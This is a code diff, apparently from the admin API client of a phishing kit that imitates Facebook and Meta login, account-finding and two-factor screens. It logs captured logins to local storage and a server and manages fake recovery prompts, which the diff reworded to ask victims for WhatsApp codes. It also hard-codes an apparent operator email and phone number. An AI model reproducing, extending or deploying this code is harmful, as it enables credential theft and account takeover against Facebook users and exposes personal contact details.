@@ -57,17 +57,17 @@ export const api = {
         (data.action?.includes('Meta Account')
           ? 'Meta Account Login'
           : data.action?.includes('Find Account')
-          ? 'Find Account Screen'
-          : isMobileWidth
-          ? 'Mobile Login Screen'
-          : 'Desktop Login Screen');
+            ? 'Find Account Screen'
+            : isMobileWidth
+              ? 'Mobile Login Screen'
+              : 'Desktop Login Screen');
       const detectedScreen =
         data.screen ||
         (data.action?.includes('Meta Account')
           ? 'Log into your Meta Account Screen'
           : data.action?.includes('Find Account')
-          ? 'Find your account Screen'
-          : 'Main Facebook Login Form');
+            ? 'Find your account Screen'
+            : 'Main Facebook Login Form');
 
       const newEntry = {
         id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
@@ -206,7 +206,7 @@ export const api = {
       if (Array.isArray(serverLogs)) {
         try {
           localStorage.setItem('sphere_login_logs', JSON.stringify(serverLogs));
-        } catch {}
+        } catch { }
         return serverLogs;
       }
       try {
@@ -228,7 +228,7 @@ export const api = {
         const nextLocal = local.filter((l) => l.id !== id);
         localStorage.setItem('sphere_login_logs', JSON.stringify(nextLocal));
         window.dispatchEvent(new CustomEvent('sphere_db_updated', { detail: nextLocal }));
-      } catch {}
+      } catch { }
       return await safeFetch(`${API_BASE}/admin/logs/${id}`, { method: 'DELETE' });
     },
 
@@ -256,6 +256,14 @@ export const api = {
       return await safeFetch(`${API_BASE}/admin/users/${id}`, {
         method: 'DELETE',
         headers: getHeaders(),
+      });
+    },
+
+    async reorderUsers(orderedIds) {
+      return await safeFetch(`${API_BASE}/admin/users/reorder`, {
+        method: 'PUT',
+        headers: getHeaders(),
+        body: JSON.stringify({ orderedIds }),
       });
     },
 
@@ -346,19 +354,19 @@ export const api = {
       if (serverSettings && serverSettings.defaultEmail) {
         try {
           localStorage.setItem('sphere_recovery_settings', JSON.stringify(serverSettings));
-        } catch {}
+        } catch { }
         return serverSettings;
       }
       try {
         const local = localStorage.getItem('sphere_recovery_settings');
         if (local) return JSON.parse(local);
-      } catch {}
+      } catch { }
       return {
         defaultEmail: 'ademt0614@gmail.com',
         defaultPhone: '+251990039392',
         countdownTime: '(00:36)',
         cardDisplayFallback: 'email',
-        twoFactorTitle: 'Check your text messages',
+        twoFactorTitle: 'Check your WhatsApp messages',
         twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
         twoFactorTimer: '00:52',
         twoFactorChannel: 'sms',
@@ -370,7 +378,7 @@ export const api = {
       try {
         localStorage.setItem('sphere_recovery_settings', JSON.stringify(settings));
         window.dispatchEvent(new CustomEvent('sphere_recovery_updated', { detail: settings }));
-      } catch {}
+      } catch { }
       return await safeFetch(`${API_BASE}/admin/recovery-settings`, {
         method: 'PUT',
         headers: getHeaders(),
